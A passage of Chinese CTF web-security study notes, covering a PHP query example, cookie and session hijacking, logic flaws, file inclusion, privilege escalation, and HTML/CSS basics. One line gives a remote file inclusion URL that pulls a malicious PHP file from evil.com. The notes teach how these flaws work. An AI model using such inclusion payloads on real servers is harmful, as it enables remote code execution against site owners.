</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#note-ctf-web-__codelineno-2-9"></a><span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$servername</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#note-ctf-web-__codelineno-2-10"></a>
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#note-ctf-web-__codelineno-2-11"></a><span class="c1">// 检查连接是否成功</span>
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#note-ctf-web-__codelineno-2-12"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">connect_error</span><span class="p">)</span> <span class="p">{</span>
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#note-ctf-web-__codelineno-2-13"></a>    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;连接失败: &quot;</span> <span class="o">.</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">connect_error</span><span class="p">);</span>
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#note-ctf-web-__codelineno-2-14"></a><span class="p">}</span>
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#note-ctf-web-__codelineno-2-15"></a>
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#note-ctf-web-__codelineno-2-16"></a><span class="c1">// 获取GET参数</span>
</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#note-ctf-web-__codelineno-2-17"></a><span class="nv">$userId</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#note-ctf-web-__codelineno-2-18"></a>
</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#note-ctf-web-__codelineno-2-19"></a><span class="c1">// 获取Cookie</span>
</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#note-ctf-web-__codelineno-2-20"></a><span class="nv">$sessionId</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;session_id&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;session_id&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#note-ctf-web-__codelineno-2-21"></a>
</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#note-ctf-web-__codelineno-2-22"></a><span class="c1">// 查询数据库</span>
</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#note-ctf-web-__codelineno-2-23"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$userId</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#note-ctf-web-__codelineno-2-24"></a>    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users WHERE id = </span><span class="si">$userId</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#note-ctf-web-__codelineno-2-25"></a>    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#note-ctf-web-__codelineno-2-26"></a>
</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#note-ctf-web-__codelineno-2-27"></a>    <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#note-ctf-web-__codelineno-2-28"></a>        <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">();</span>
</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#note-ctf-web-__codelineno-2-29"></a>        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;用户信息: &lt;/p&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#note-ctf-web-__codelineno-2-30"></a>        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;ID: &quot;</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&lt;/p&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31" href="#note-ctf-web-__codelineno-2-31"></a>        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;姓名: &quot;</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&lt;/p&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32" href="#note-ctf-web-__codelineno-2-32"></a>        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;邮箱: &quot;</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&lt;/p&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33" href="#note-ctf-web-__codelineno-2-33"></a>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34" href="#note-ctf-web-__codelineno-2-34"></a>        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;没有找到对应的用户。&lt;/p&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-2-35"><a id="__codelineno-2-35" name="__codelineno-2-35" href="#note-ctf-web-__codelineno-2-35"></a>    <span class="p">}</span>
</span><span id="__span-2-36"><a id="__codelineno-2-36" name="__codelineno-2-36" href="#note-ctf-web-__codelineno-2-36"></a><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span id="__span-2-37"><a id="__codelineno-2-37" name="__codelineno-2-37" href="#note-ctf-web-__codelineno-2-37"></a>    <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;无效的用户ID。&lt;/p&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-2-38"><a id="__codelineno-2-38" name="__codelineno-2-38" href="#note-ctf-web-__codelineno-2-38"></a><span class="p">}</span>
</span><span id="__span-2-39"><a id="__codelineno-2-39" name="__codelineno-2-39" href="#note-ctf-web-__codelineno-2-39"></a>
</span><span id="__span-2-40"><a id="__codelineno-2-40" name="__codelineno-2-40" href="#note-ctf-web-__codelineno-2-40"></a><span class="c1">// 关闭数据库连接</span>
</span><span id="__span-2-41"><a id="__codelineno-2-41" name="__codelineno-2-41" href="#note-ctf-web-__codelineno-2-41"></a><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
</span><span id="__span-2-42"><a id="__codelineno-2-42" name="__codelineno-2-42" href="#note-ctf-web-__codelineno-2-42"></a><span class="cp">?&gt;</span>
</span></code></pre></div>
</details>
<h3 id="note-ctf-web-sql">SQL 简单入门<a class="headerlink" href="#note-ctf-web-sql" title="Permanent link">&para;</a></h3>
<p>入门可以从 MySQL 开始。</p>
<h3 id="note-ctf-web-_4">相关安全话题<a class="headerlink" href="#note-ctf-web-_4" title="Permanent link">&para;</a></h3>
<ul>
<li>Cookie 与 Session<ul>
<li><strong>Cookie</strong>：存储在客户端的小型文本文件，通常用于存储用户的偏好设置、身份验证信息等。<ul>
<li><strong>示例</strong>：用户登录后，服务器发送一个包含用户ID的Cookie到客户端，客户端在后续请求中自动包含该Cookie，以便服务器识别用户。</li>
<li><strong>Cookie劫持</strong>：攻击者通过XSS攻击或其他手段获取用户的Cookie，从而冒充用户身份。</li>
</ul>
</li>
<li><strong>Session</strong>：存储在服务器端的临时数据存储区域，通常用于存储用户的会话状态信息。<ul>
<li><strong>示例</strong>：用户登录后，服务器创建一个Session，并将Session ID通过Cookie发送给客户端。客户端在后续请求中包含该Session ID，服务器根据Session ID查找对应的Session数据。</li>
<li>如果服务器被攻破，Session中就可能有一些敏感信息。</li>
</ul>
</li>
</ul>
</li>
<li>逻辑漏洞：验证不充分、想当然的写法、条件竞争、未发现的旁门左道……<ul>
<li>程序员的傲慢可能会让他认为<code>a==1&amp;&amp;a==2</code> 一定是 false 但……</li>
</ul>
</li>
</ul>
<p><img alt="Untitled" src="../NOTE/CTF/img/1.png" /></p>
<ul>
<li>任意文件读与任意代码执行<ul>
<li>例如一个Web应用允许用户上传头像，但未对上传的文件进行严格的类型和内容检查。攻击者上传一个包含恶意代码的文件，并通过文件包含漏洞执行该代码，从而控制服务器。</li>
<li>CTF竞赛中，能读服务器上 <code>/flag</code> 则读，否则就暗示我们需要 RCE (不然连 flag 在哪个文件都不知道).</li>
</ul>
</li>
<li>文件包含：例如一个Web应用允许用户通过URL参数指定要包含的文件，如<code>index.php?page=about</code>。攻击者可以通过构造恶意URL，如<code>index.php?page=http://evil.com/malicious.php</code>，包含远程恶意文件，从而执行恶意代码。</li>
<li>越权：例如一个Web应用允许用户查看自己的订单信息，但未正确验证用户的身份。攻击者可以通过篡改URL参数，如<code>order.php?id=123</code>，查看其他用户的订单信息。<ul>
<li>永远不要相信用户的数据！前端代码也许永远不会访问其他用户的数据，但这不代表恶意攻击者就不会</li>
</ul>
</li>
</ul>
<h3 id="note-ctf-web-_5">前端：可视化与操作逻辑<a class="headerlink" href="#note-ctf-web-_5" title="Permanent link">&para;</a></h3>
<p>前端开发主要关注用户界面的设计和用户交互。在这一部分，我们将学习HTML、CSS和JavaScript的基础知识，以及前端安全的重要性和常见的防护措施。同时，我们会通过经典案例分析前端漏洞的利用方法和防护策略。</p>
<ul>
<li>HTML / CSS / JS基础<ul>
<li>HTML 简单介绍<ul>
<li>格式：各个标签嵌套的层级结构，每个标签基本上就对应页面上的一个元素</li>
</ul>
</li>
</ul>
</li>
</ul>
<details class="note">
<summary>Note</summary>
<div class="language-html highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-ctf-web-__codelineno-3-1"></a><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#note-ctf-web-__codelineno-3-2"></a><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&quot;zh-CN&quot;</span><span class="p">&gt;</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#note-ctf-web-__codelineno-3-3"></a><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#note-ctf-web-__codelineno-3-4"></a>    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span><span class="p">&gt;</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#note-ctf-web-__codelineno-3-5"></a>    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>HTML 和 CSS 示例<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#note-ctf-web-__codelineno-3-6"></a>    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;styles.css&quot;</span><span class="p">&gt;</span>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#note-ctf-web-__codelineno-3-7"></a><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#note-ctf-web-__codelineno-3-8"></a><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#note-ctf-web-__codelineno-3-9"></a>    <span class="p">&lt;</span><span class="nt">header</span><span class="p">&gt;</span>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#note-ctf-web-__codelineno-3-10"></a>        <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>欢迎来到我的网站<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#note-ctf-web-__codelineno-3-11"></a>        <span class="p">&lt;</span><span class="nt">nav</span><span class="p">&gt;</span>
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#note-ctf-web-__codelineno-3-12"></a>            <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#note-ctf-web-__codelineno-3-13"></a>                <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#home&quot;</span><span class="p">&gt;</span>首页<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#note-ctf-web-__codelineno-3-14"></a>                <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#about&quot;</span><span class="p">&gt;</span>关于我们<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#note-ctf-web-__codelineno-3-15"></a>                <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#contact&quot;</span><span class="p">&gt;</span>联系我们<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#note-ctf-web-__codelineno-3-16"></a>            <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#note-ctf-web-__codelineno-3-17"></a>        <span class="p">&lt;/</span><span class="nt">nav</span><span class="p">&gt;</span>
</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#note-ctf-web-__codelineno-3-18"></a>    <span class="p">&lt;/</span><span class="nt">header</span><span class="p">&gt;</span>
</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#note-ctf-web-__codelineno-3-19"></a>    <span class="p">&lt;</span><span class="nt">main</span><span class="p">&gt;</span>
</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#note-ctf-web-__codelineno-3-20"></a>        <span class="p">&lt;</span><span class="nt">section</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;home&quot;</span><span class="p">&gt;</span>
</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#note-ctf-web-__codelineno-3-21"></a>            <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>首页<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#note-ctf-web-__codelineno-3-22"></a>            <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;intro&quot;</span><span class="p">&gt;</span>这是我们的首页，欢迎您的到来！<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#note-ctf-web-__codelineno-3-23"></a>        <span class="p">&lt;/</span><span class="nt">section</span><span class="p">&gt;</span>
</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#note-ctf-web-__codelineno-3-24"></a>        <span class="p">&lt;</span><span class="nt">section</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;about&quot;</span><span class="p">&gt;</span>
</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#note-ctf-web-__codelineno-3-25"></a>            <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>关于我们<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#note-ctf-web-__codelineno-3-26"></a>            <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;intro&quot;</span><span class="p">&gt;</span>我们是一家专业的Web开发公司。<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#note-ctf-web-__codelineno-3-27"></a>        <span class="p">&lt;/</span><span class="nt">section</span><span class="p">&gt;</span>
</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#note-ctf-web-__codelineno-3-28"></a>        <span class="p">&lt;</span><span class="nt">section</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;contact&quot;</span><span class="p">&gt;</span>
</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#note-ctf-web-__codelineno-3-29"></a>            <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>联系我们<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#note-ctf-web-__codelineno-3-30"></a>            <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;intro&quot;</span><span class="p">&gt;</span>如果您有任何问题，请随时联系我们。<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31" href="#note-ctf-web-__codelineno-3-31"></a>            <span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;</span>
</span><span id="__span-3-32"><a id="__codelineno-3-32" name="__codelineno-3-32" href="#note-ctf-web-__codelineno-3-32"></a>                <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;name&quot;</span><span class="p">&gt;</span>姓名:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span><span id="__span-3-33"><a id="__codelineno-3-33" name="__codelineno-3-33" href="#note-ctf-web-__codelineno-3-33"></a>                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;name&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;name&quot;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span><span id="__span-3-34"><a id="__codelineno-3-34" name="__codelineno-3-34" href="#note-ctf-web-__codelineno-3-34"></a>                <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;email&quot;</span><span class="p">&gt;</span>邮箱:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span><span id="__span-3-35"><a id="__codelineno-3-35" name="__codelineno-3-35" href="#note-ctf-web-__codelineno-3-35"></a>                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span><span id="__span-3-36"><a id="__codelineno-3-36" name="__codelineno-3-36" href="#note-ctf-web-__codelineno-3-36"></a>                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;提交&quot;</span><span class="p">&gt;</span>
</span><span id="__span-3-37"><a id="__codelineno-3-37" name="__codelineno-3-37" href="#note-ctf-web-__codelineno-3-37"></a>            <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span><span id="__span-3-38"><a id="__codelineno-3-38" name="__codelineno-3-38" href="#note-ctf-web-__codelineno-3-38"></a>        <span class="p">&lt;/</span><span class="nt">section</span><span class="p">&gt;</span>
</span><span id="__span-3-39"><a id="__codelineno-3-39" name="__codelineno-3-39" href="#note-ctf-web-__codelineno-3-39"></a>    <span class="p">&lt;/</span><span class="nt">main</span><span class="p">&gt;</span>
</span><span id="__span-3-40"><a id="__codelineno-3-40" name="__codelineno-3-40" href="#note-ctf-web-__codelineno-3-40"></a>    <span class="p">&lt;</span><span class="nt">footer</span><span class="p">&gt;</span>
</span><span id="__span-3-41"><a id="__codelineno-3-41" name="__codelineno-3-41" href="#note-ctf-web-__codelineno-3-41"></a>        <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span><span class="ni">&amp;copy;</span> 2023 我的网站<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span><span id="__span-3-42"><a id="__codelineno-3-42" name="__codelineno-3-42" href="#note-ctf-web-__codelineno-3-42"></a>    <span class="p">&lt;/</span><span class="nt">footer</span><span class="p">&gt;</span>
</span><span id="__span-3-43"><a id="__codelineno-3-43" name="__codelineno-3-43" href="#note-ctf-web-__codelineno-3-43"></a><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span><span id="__span-3-44"><a id="__codelineno-3-44" name="__codelineno-3-44" href="#note-ctf-web-__codelineno-3-44"></a><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span> 
</span></code></pre></div>
</details>
<ul>
<li>CSS 简单介绍<ul>
<li>用途：元素宽度、外部间隔、内部边距、字体颜色……</li>
<li>选择器语法：选择你要把这些属性应用给哪些元素<ul>
<li>元素选择器<code>body</code></li>
<li>类选择器<code>.my-class</code></li>
<li>ID选择器<code>#myid</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<details class="note">
<summary>Note</summary>
<div class="language-css highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-ctf-web-__codelineno-4-1"></a><span class="c">/* 基本样式 */</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#note-ctf-web-__codelineno-4-2"></a><span class="nt">body</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#note-ctf-web-__codelineno-4-3"></a><span class="w">    </span><span class="k">font-family</span><span class="p">:</span><span class="w"> </span><span class="n">Arial</span><span class="p">,</span><span class="w"> </span><span class="kc">sans-serif</span><span class="p">;</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#note-ctf-web-__codelineno-4-4"></a><span class="w">    </span><span class="k">margin</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#note-ctf-web-__codelineno-4-5"></a><span class="w">    </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#note-ctf-web-__codelineno-4-6"></a><span class="w">    </span><span class="k">background-color</span><span class="p">:</span><span class="w"> </span><span class="mh">#f4f4f4</span><span class="p">;</span>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#note-ctf-web-__codelineno-4-7"></a><span class="p">}</span>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#note-ctf-web-__codelineno-4-8"></a>
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#note-ctf-web-__codelineno-4-9"></a><span class="nt">header</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#note-ctf-web-__codelineno-4-10"></a><span class="w">    </span><span class="k">background-color</span><span class="p">:</span><span class="w"> </span><span class="mh">#333</span><span class="p">;</span>
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#note-ctf-web-__codelineno-4-11"></a><span class="w">    </span><span class="k">color</span><span class="p">:</span><span class="w"> </span><span class="mh">#fff</span><span class="p">;</span>
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#note-ctf-web-__codelineno-4-12"></a><span class="w">    </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="kt">px</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#note-ctf-web-__codelineno-4-13"></a><span class="w">    </span><span class="k">text-align</span><span class="p">:</span><span class="w"> </span><span class="kc">center</span><span class="p">;</span>
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#note-ctf-web-__codelineno-4-14"></a><span class="p">}</span>
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#note-ctf-web-__codelineno-4-15"></a>
</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#note-ctf-web-__codelineno-4-16"></a><span class="nt">nav</span><span class="w"> </span><span class="nt">ul</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#note-ctf-web-__codelineno-4-17"></a><span class="w">    </span><span class="k">list-style</span><span class="p">:</span><span class="w"> </span><span class="kc">none</span><span class="p">;</span>
</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#note-ctf-web-__codelineno-4-18"></a><span class="w">    </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#note-ctf-web-__codelineno-4-19"></a><span class="p">}</span>
</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#note-ctf-web-__codelineno-4-20"></a>
</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#note-ctf-web-__codelineno-4-21"></a><span class="nt">nav</span><span class="w"> </span><span class="nt">ul</span><span class="w"> </span><span class="nt">li</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#note-ctf-web-__codelineno-4-22"></a><span class="w">    </span><span class="k">display</span><span class="p">:</span><span class="w"> </span><span class="kc">inline</span><span class="p">;</span>
</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#note-ctf-web-__codelineno-4-23"></a><span class="w">    </span><span class="k">margin</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="mi">10</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#note-ctf-web-__codelineno-4-24"></a><span class="p">}</span>
</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#note-ctf-web-__codelineno-4-25"></a>
</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#note-ctf-web-__codelineno-4-26"></a><span class="nt">nav</span><span class="w"> </span><span class="nt">ul</span><span class="w"> </span><span class="nt">li</span><span class="w"> </span><span class="nt">a</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#note-ctf-web-__codelineno-4-27"></a><span class="w">    </span><span class="k">color</span><span class="p">:</span><span class="w"> </span><span class="mh">#fff</span><span class="p">;</span>
